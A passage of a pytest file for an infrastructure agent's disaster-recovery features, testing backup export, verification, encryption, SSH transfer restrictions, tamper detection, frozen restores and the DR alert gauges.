        "infra_agent.dr.transfer.subprocess_runner",
        lambda argv, timeout=0: CommandResult(
            tuple(argv), 255, "", "Permission denied (publickey)"
        ),
    )

    answer = duties.dr_export()

    assert answer["ok"] is False and answer["pushed"] is False
    recorded = dr_state.load(estate)
    assert recorded.last_export_at == NOW, "DRExportStale would fire on a working export"
    assert recorded.last_push_at is None, "StandbyStale is the alert that should fire"
    assert not (estate.dr_dir / old).exists(), "retention still applied"
    text, critical = notifier.messages[-1]
    assert "not shipped" in text
    assert critical is False, "a nightly critical page is how an owner learns to ignore DR alerts"


def test_an_export_that_cannot_run_at_all_pages_the_owner(estate, monkeypatch):
    estate.dr_target = "ssh://infra@standby/srv/infra-dr"
    duties, notifier = duties_for(estate)

    def explode(*_args, **_kwargs):
        raise RuntimeError("no space left on device")

    monkeypatch.setattr("infra_agent.dr.export.export_bundle", explode)

    answer = duties.dr_export()

    assert answer["ok"] is False
    assert notifier.messages[-1][1] is True


def test_the_weekly_duty_verifies_the_newest_bundle_and_reports(estate):
    make_bundle(estate, estate.dr_dir)
    duties, notifier = duties_for(estate)

    answer = duties.dr_verify()

    assert answer["ok"] is True
    assert dr_state.load(estate).last_verify_ok is True
    text, critical = notifier.messages[-1]
    assert "verified" in text and critical is False


def test_a_failed_weekly_verification_pages_the_owner(estate):
    result = make_bundle(estate, estate.dr_dir)
    repack(result.bundle, drop={"secrets/devices.enc.yaml"}).replace(result.bundle)
    duties, notifier = duties_for(estate)

    answer = duties.dr_verify()

    assert answer["ok"] is False
    text, critical = notifier.messages[-1]
    assert "FAILED" in text and critical is True


def test_no_bundle_at_all_is_the_loudest_case(estate):
    """ "Nothing to verify" is not a pass. It is the state in which the platform
    has no backup and nobody has noticed."""
    duties, notifier = duties_for(estate)

    answer = duties.dr_verify()

    assert answer["ok"] is False
    assert notifier.messages[-1][1] is True


def test_the_dr_duties_never_ask_the_model_anything(estate, tmp_path, monkeypatch):
    """`runner` is a bare object, so any call into the LLM path raises. These
    two duties compute facts and send them; there is no prose to write."""
    estate.dr_target = str(tmp_path / "standby")
    duties, _notifier = duties_for(estate)
    monkeypatch.setattr("infra_agent.dr.export.pg_dump_to_file", FakePgDump())

    duties.dr_export()
    duties.dr_verify()


# -- "not configured" is not "broken" -----------------------------------------


def test_a_platform_without_grafana_is_not_a_failed_backup(estate, tmp_path):
    """A nightly duty that pages the owner about a service they deliberately do
    not run is a duty they turn off - and then it is not there on the night it
    matters."""
    result = make_bundle(estate, tmp_path / "out", grafana=None)

    assert result.ok
    assert result.warnings == []
    assert result.summary()["not_configured"] == ["grafana"]
    grafana = result.manifest.component("grafana")
    assert grafana is not None and grafana.skipped is True


def test_a_bundle_exported_without_postgres_still_verifies(estate, tmp_path):
    estate.postgres_dsn = None

    result = make_bundle(estate, tmp_path / "out")
    report = verify(result.bundle)

    assert result.ok
    assert report.ok, [check.line() for check in report.failures()]
    postgres = next(c for c in report.checks if c.name == "postgres")
    assert postgres.ok and "not set" in postgres.detail


def test_a_configured_database_that_will_not_dump_is_still_a_failure(estate, tmp_path):
    """The distinction only cuts one way: a platform that HAS Postgres and
    could not dump it has a hole in its backup."""
    result = make_bundle(estate, tmp_path / "out", pg_dumper=FakePgDump(fail={"infra", "netbox"}))

    assert not result.ok
    postgres = result.manifest.component("postgres")
    assert postgres is not None and postgres.failed
    assert verify(result.bundle).ok is False


def test_a_config_repo_outside_data_dir_is_still_bundled_and_still_not_copied_twice(
    estate, tmp_path
):
    """INFRA_CONFIG_REPO_DIR may point anywhere. The exclusion is computed by
    relative path, so a repo that is not under data_dir simply has nothing to
    exclude - and must not silently stop being exported."""
    outside = tmp_path / "elsewhere" / "configs"
    estate.config_repo_dir = outside
    ConfigGitStore(outside).write("fw-01", "config", "config system global\n")

    result = make_bundle(estate, tmp_path / "out")

    assert result.ok
    paths = {entry.path for entry in result.manifest.files}
    assert "configs.bundle" in paths
    assert not any(path.startswith("data/elsewhere") for path in paths)
    assert verify(result.bundle).ok


# -- the production cwd is not a git checkout ---------------------------------


def test_verify_works_from_a_directory_that_is_not_a_git_repository(estate, tmp_path, monkeypatch):
    """`git bundle verify` insists on being run inside a repository, and the
    place the weekly duty runs is /app in a container that holds no repo. The
    check has to bring its own."""
    result = make_bundle(estate, tmp_path / "out")
    outside = tmp_path / "not-a-repo"
    outside.mkdir()
    monkeypatch.chdir(outside)

    report = verify(result.bundle)

    config = next(check for check in report.checks if check.name == "config_repo")
    assert config.ok, config.detail
    assert "fsck clean" in config.detail
    assert report.ok


def test_import_works_from_a_directory_that_is_not_a_git_repository(estate, tmp_path, monkeypatch):
    result = make_bundle(estate, tmp_path / "out")
    restored = Settings(
        data_dir=tmp_path / "restored" / "data",
        secrets_dir=tmp_path / "restored" / "secrets",
        seed_inventory=tmp_path / "restored" / "inventory" / "seed.yaml",
    )
    outside = tmp_path / "somewhere-else"
    outside.mkdir()
    monkeypatch.chdir(outside)

    report = import_bundle(result.bundle, restored)

    assert (restored.config_repo / ".git").exists()
    assert report.frozen


# -- a bundle is credential-equivalent ----------------------------------------


def mode_of(path: Path) -> int:
    return path.stat().st_mode & 0o777


def test_the_bundle_and_its_sidecar_are_not_world_readable(estate, tmp_path):
    """configs.bundle carries raw running-configs (SNMP communities, type-7
    keys, FortiOS ENC blobs) and the pg dump carries NetBox tokens. 0644 makes
    that readable by every account on the box, and rsync would carry the mode
    to the standby."""
    result = make_bundle(estate, tmp_path / "out")

    assert mode_of(result.bundle) == 0o600
    assert mode_of(result.checksum) == 0o600
    assert mode_of(tmp_path / "out") == 0o700


def test_the_push_pins_the_host_key_and_sets_the_mode_on_the_far_end(estate, tmp_path):
    runner = FakeRunner()
    export_bundle(
        estate,
        to="ssh://infra@standby/srv/infra-dr",
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
        runner=runner,
        keep_dir=tmp_path / "local",
    )

    rsync = " ".join(runner.ran("rsync")[0])
    assert "--chmod=F600,D700" in rsync
    assert "StrictHostKeyChecking=yes" in rsync
    assert "accept-new" not in rsync, "trusting whatever answers on the management VLAN"


def test_a_configured_known_hosts_file_is_the_one_that_is_used():
    policy = transfer.SshPolicy(known_hosts=Path("/root/.ssh/known_hosts"))

    assert "UserKnownHostsFile=/root/.ssh/known_hosts" in policy.options()
    assert "StrictHostKeyChecking=yes" in policy.options()


# -- the standby key is restricted to rsync -----------------------------------


def test_a_restricted_key_means_rsync_and_nothing_else(estate, tmp_path):
    """The README's authorized_keys entry forces rrsync: every session runs
    rsync whatever the client asked for, so `ssh host mkdir -p` does not create
    a directory - it starts an rsync server, reads EOF and exits non-zero. Code
    that assumes a shell there fails every single night."""
    runner = FakeRunner()

    result = export_bundle(
        estate,
        to="ssh://infra@standby/srv/infra-dr",
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
        runner=runner,
        keep_dir=tmp_path / "local",
    )

    assert result.pushed_to == "infra@standby:/srv/infra-dr"
    assert [call[0] for call in runner.calls] == ["rsync"]
    assert not runner.ran("ssh"), "a restricted key cannot run mkdir, ls or rm"


def test_a_restricted_target_is_pruned_by_the_standby_not_by_us():
    runner = FakeRunner()

    removed = transfer.prune(
        parse_target("ssh://infra@standby/srv/infra-dr"), 14, runner=runner, now=NOW
    )

    assert removed == []
    assert runner.calls == [], "deploy/standby/prune.sh does this, from the standby's cron"


def test_asking_a_restricted_key_for_a_shell_says_what_to_change():
    with pytest.raises(DRError, match="restricted"):
        transfer.ensure_remote_dir(parse_target("ssh://infra@standby/srv/dr"), runner=FakeRunner())


# -- encryption of the copy that leaves the building --------------------------


@dataclass
class FakeAge:
    """`age` without age: a header, the recipient, then the plaintext."""

    calls: list[list[str]] = field(default_factory=list)
    fail: bool = False

    def __call__(self, argv: Any) -> tuple[int, str]:
        argv = list(argv)
        self.calls.append(argv)
        if self.fail:
            return 1, "age: error: no identity matched any of the recipients"
        if argv[1] == "-r":
            recipient, dest, src = argv[2], Path(argv[4]), Path(argv[5])
            dest.write_bytes(
                b"age-encryption.org/v1\n" + recipient.encode() + b"\n" + src.read_bytes()
            )
            return 0, ""
        dest, src = Path(argv[5]), Path(argv[6])
        dest.write_bytes(src.read_bytes().split(b"\n", 2)[2])
        return 0, ""


def encrypting(estate: Settings, tmp_path: Path) -> Settings:
    identity = tmp_path / "keys.txt"
    identity.write_text("AGE-SECRET-KEY-1TEST\n")
    estate.dr_age_recipient = "age1testrecipient"
    estate.dr_age_identity = identity
    return estate


def test_the_copy_that_travels_is_encrypted_when_a_recipient_is_configured(estate, tmp_path):
    age = FakeAge()
    runner = FakeRunner()
    encrypting(estate, tmp_path)

    result = export_bundle(
        estate,
        to="ssh://infra@standby/srv/infra-dr",
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
        runner=runner,
        age_runner=age,
        keep_dir=tmp_path / "local",
    )

    assert result.encrypted_copy is not None
    assert result.encrypted_copy.name.endswith(".tar.gz.age")
    assert mode_of(result.encrypted_copy) == 0o600
    pushed = runner.ran("rsync")[0]
    assert any(part.endswith(".tar.gz.age") for part in pushed)
    assert not any(part.endswith(".tar.gz") for part in pushed), (
        "the plaintext bundle must not travel when a recipient is configured"
    )
    assert result.bundle == result.encrypted_copy
    assert not list((tmp_path / "local").glob("*.tar.gz")), (
        "a plaintext copy of every running-config must not sit on the volume for a fortnight"
    )
    assert dr_state.load(estate).last_export_bundle.endswith(".age")


def test_an_encrypted_bundle_verifies_and_imports_with_the_key(estate, tmp_path):
    age = FakeAge()
    encrypting(estate, tmp_path)
    export_bundle(
        estate,
        to=str(tmp_path / "standby"),
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
        age_runner=age,
    )
    encrypted = next((tmp_path / "standby").glob("*.tar.gz.age"))
    restored = Settings(
        data_dir=tmp_path / "restored" / "data",
        secrets_dir=tmp_path / "restored" / "secrets",
        seed_inventory=tmp_path / "restored" / "inventory" / "seed.yaml",
        dr_age_identity=estate.dr_age_identity,
    )

    report = verify(encrypted, settings=estate, age_runner=age)
    imported = import_bundle(encrypted, restored, age_runner=age)

    assert report.ok, [c.line() for c in report.failures()]
    assert (restored.data_dir / "plans.db").exists()
    assert imported.frozen


def test_an_encrypted_bundle_without_the_key_says_so_rather_than_half_restoring(estate, tmp_path):
    age = FakeAge()
    encrypting(estate, tmp_path)
    export_bundle(
        estate,
        to=str(tmp_path / "standby"),
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
        age_runner=age,
    )
    encrypted = next((tmp_path / "standby").glob("*.tar.gz.age"))

    report = verify(encrypted, settings=estate, age_runner=FakeAge(fail=True))

    assert not report.ok
    assert any(check.name == "decrypt" and not check.ok for check in report.checks)


# -- tamper detection: the sidecar covers the manifest ------------------------


def test_import_refuses_a_bundle_whose_sidecar_is_missing(estate, tmp_path):
    """The manifest hashes every member; only the sidecar covers the manifest.
    A tamperer who deletes it and rewrites manifest plus member consistently
    passes every other check."""
    result = make_bundle(estate, tmp_path / "out")
    result.checksum.unlink()
    restored = Settings(
        data_dir=tmp_path / "restored" / "data",
        secrets_dir=tmp_path / "restored" / "secrets",
        seed_inventory=tmp_path / "restored" / "inventory" / "seed.yaml",
    )

    with pytest.raises(DRError, match="checksum"):
        import_bundle(result.bundle, restored)

    assert not restored.data_dir.exists(), "nothing was written before the refusal"


def test_verify_flags_a_missing_sidecar_but_still_checks_the_bundle(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    result.checksum.unlink()

    report = verify(result.bundle)

    checksum = next(check for check in report.checks if check.name == "checksum")
    assert checksum.ok, "verifying a suspect bundle is exactly what you want to be able to do"
    assert "suspect" in checksum.detail
    assert report.ok


# -- a restore always ends frozen ---------------------------------------------


def test_a_step_that_fails_still_leaves_the_platform_frozen(estate, tmp_path, monkeypatch):
    """The compose stack mounts ../secrets read-only, so restoring secrets in
    the container raises OSError. A half-restored, unfrozen platform is the
    worst of both worlds."""
    result = make_bundle(estate, tmp_path / "out")
    restored = Settings(
        data_dir=tmp_path / "restored" / "data",
        secrets_dir=tmp_path / "restored" / "secrets",
        seed_inventory=tmp_path / "restored" / "inventory" / "seed.yaml",
    )

    def read_only(*_args: Any, **_kwargs: Any) -> None:
        raise OSError(30, "Read-only file system")

    monkeypatch.setattr("infra_agent.dr.restore._restore_secrets", read_only)

    report = import_bundle(result.bundle, restored)

    assert (restored.data_dir / "FROZEN").exists()
    assert report.frozen
    assert (restored.data_dir / "plans.db").exists(), "the rest of the restore still happened"
    assert any("Read-only file system" in warning for warning in report.warnings)


def test_force_moves_the_previous_installation_aside_instead_of_merging(estate, tmp_path):
    """A leftover plans.db-journal next to a freshly restored plans.db is
    replayed by SQLite on the next open and corrupts the restored plan store."""
    result = make_bundle(estate, tmp_path / "out")
    restored = Settings(
        data_dir=tmp_path / "restored" / "data",
        secrets_dir=tmp_path / "restored" / "secrets",
        seed_inventory=tmp_path / "restored" / "inventory" / "seed.yaml",
    )
    restored.data_dir.mkdir(parents=True)
    (restored.data_dir / "plans.db-journal").write_bytes(b"a hot journal from another estate")
    (restored.data_dir / "snapshots").mkdir()
    (restored.data_dir / "snapshots" / "ghost.json").write_text("{}")

    report = import_bundle(result.bundle, restored, force=True, now=NOW)

    assert not (restored.data_dir / "plans.db-journal").exists()
    assert not (restored.data_dir / "snapshots" / "ghost.json").exists()
    aside = restored.data_dir / "pre-import" / "20260908T021500Z"
    assert (aside / "plans.db-journal").exists(), "evidence is moved, never deleted"
    assert (aside / "snapshots" / "ghost.json").exists()
    assert (restored.data_dir / "FROZEN").exists()
    assert any("pre-import" in warning for warning in report.warnings)


# -- SQLite consistency -------------------------------------------------------


def test_a_writer_mid_transaction_does_not_produce_a_torn_plan_store(estate, tmp_path):
    """The Telegram bot may be writing an approval at 02:15. A file copy of a
    database plus a separate copy of its journal can produce a pair that do not
    belong together; the online backup API cannot."""
    import sqlite3

    conn = sqlite3.connect(estate.data_dir / "plans.db")
    conn.execute("BEGIN IMMEDIATE")
    conn.execute(
        "INSERT INTO plans (id, state, tier, created_at, body) VALUES (?,?,?,?,?)",
        ("half-written", "draft", 1, NOW.isoformat(), "{}"),
    )
    try:
        result = make_bundle(estate, tmp_path / "out")
    finally:
        conn.rollback()
        conn.close()

    report = verify(result.bundle)

    plans = next(check for check in report.checks if check.name == "plans_db")
    assert plans.ok, plans.detail
    names = set(tarfile.open(result.bundle).getnames())
    assert not any(name.endswith("-journal") or name.endswith("-wal") for name in names)


# -- a local standby target ---------------------------------------------------


def test_the_weekly_duty_verifies_the_newest_bundle_on_a_local_target(estate, tmp_path):
    """An NFS export from the second ESXi host is a legitimate standby. The
    bundle is written there and data_dir/dr stays empty; a duty that only
    looked in data_dir/dr would page 'no DR bundle' every Saturday."""
    estate.dr_target = str(tmp_path / "nfs-standby")
    duties, notifier = duties_for(estate)
    make_bundle(estate, tmp_path / "nfs-standby")

    answer = duties.dr_verify()

    assert answer["ok"] is True
    assert dr_state.load(estate).last_verify_ok is True
    assert not any("no DR bundle" in text for text, _critical in notifier.messages)


# -- the name a bundle carries ------------------------------------------------


def test_the_manifest_host_is_the_vm_name_not_a_container_id(estate, tmp_path, monkeypatch):
    """Inside compose, gethostname() is a 12-hex container id, and the field an
    operator reads at 3am becomes noise that changes on every deploy."""
    monkeypatch.setattr("infra_agent.dr.export.socket.gethostname", lambda: "3f2a9c1b0e4d")

    result = build_bundle(
        estate, dest_dir=tmp_path / "out", now=NOW, pg_dumper=FakePgDump(), grafana=fake_grafana()
    )

    assert result.manifest.host == estate.mgmt_vm_name
    assert result.bundle.name == "infra-dr-mgmt-01-20260908T021500Z.tar.gz"


def test_a_real_hostname_is_left_alone(estate, tmp_path, monkeypatch):
    monkeypatch.setattr("infra_agent.dr.export.socket.gethostname", lambda: "mgmt-01.lab")

    result = build_bundle(
        estate, dest_dir=tmp_path / "out", now=NOW, pg_dumper=FakePgDump(), grafana=fake_grafana()
    )

    assert result.manifest.host == "mgmt-01.lab"


# -- the DR gauges answer the same way in every process -----------------------


def test_a_process_that_only_imports_the_metrics_module_does_not_claim_a_failed_verify():
    """prometheus_client's default for a Gauge is 0, and 0 on
    `infra_dr_last_verify_ok` is DRVerifyFailed - critical, "your backup does
    not restore". The agent serves /metrics through make_asgi_app() rather than
    start_metrics_server, so the gauges have to be armed at import."""
    import subprocess
    import sys

    proc = subprocess.run(
        [
            sys.executable,
            "-c",
            "from prometheus_client import generate_latest\n"
            "import infra_agent.monitoring.metrics  # noqa: F401\n"
            "print(generate_latest().decode())",
        ],
        capture_output=True,
        text=True,
        check=True,
    )

    assert "infra_dr_last_verify_ok 1.0" in proc.stdout
    assert "infra_dr_last_verify_ok 0.0" not in proc.stdout
    assert "infra_dr_configured 0.0" in proc.stdout, "no target configured in a bare process"


def test_the_gauges_are_armed_whichever_module_is_imported_first():
    """`infra_agent.dr.state` imports the metrics module, so arming at import
    time has to survive being reached through a half-built dr package - which
    is what happens in the CLI, where `infra dr ...` imports dr first."""
    import subprocess
    import sys

    proc = subprocess.run(
        [
            sys.executable,
            "-c",
            "from infra_agent.dr import state  # noqa: F401\n"
            "from prometheus_client import generate_latest\n"
            "print(generate_latest().decode())",
        ],
        capture_output=True,
        text=True,
        check=True,
    )

    assert "infra_dr_last_verify_ok 1.0" in proc.stdout
    assert "could not arm" not in proc.stderr


def test_the_agent_metrics_endpoint_reports_the_recorded_dr_state(estate):
    """Prometheus scrapes infra-agent:9102/metrics too, and a DR gauge that
    reads 0 there fires the alert whatever the collectors say."""
    pytest.importorskip("fastapi")
    from fastapi.testclient import TestClient

    from infra_agent.agent.webhook import build_app
    from infra_agent.dr import state as module

    estate.dr_target = "ssh://infra@standby/srv/infra-dr"
    dr_state.save(
        dr_state.DRState(
            last_export_at=NOW,
            last_export_bundle="infra-dr-mgmt-01-20260908T021500Z.tar.gz",
            last_verify_at=NOW,
            last_verify_ok=False,
        ),
        estate,
    )
    module.arm_metrics(estate)
    try:
        with TestClient(build_app(object(), settings=estate)) as client:
            body = client.get("/metrics").text
    finally:
        module.arm_metrics(None)

    exported = next(
        line for line in body.splitlines() if line.startswith("infra_dr_last_export_timestamp")
    )
    assert float(exported.split()[1]) == NOW.timestamp()
    assert "infra_dr_last_verify_ok 0.0" in body
    assert "infra_dr_configured 1.0" in body


def test_the_weekly_duty_verifies_the_encrypted_bundle_it_actually_has(
    estate, tmp_path, monkeypatch
):
    """With a recipient configured the only bundle on disk is the `.age` one.
    Verifying it every week is what proves the age key still opens it - the
    failure this mechanism is most likely to have, and the one that turns every
    bundle since the last key rotation into an archive of noise."""
    age = FakeAge()
    monkeypatch.setattr("infra_agent.dr.crypt._run", age)
    encrypting(estate, tmp_path)
    estate.dr_target = str(tmp_path / "nfs-standby")
    duties, notifier = duties_for(estate)
    monkeypatch.setattr("infra_agent.dr.export.pg_dump_to_file", FakePgDump())

    exported = duties.dr_export()
    verified = duties.dr_verify()

    assert exported["ok"] is True
    assert exported["bundle"].endswith(".tar.gz.age")
    assert verified["ok"] is True, verified
    assert any(argv[1] == "-d" for argv in age.calls), "the key was exercised, not assumed"
    assert not any("no DR bundle" in text for text, _critical in notifier.messages)
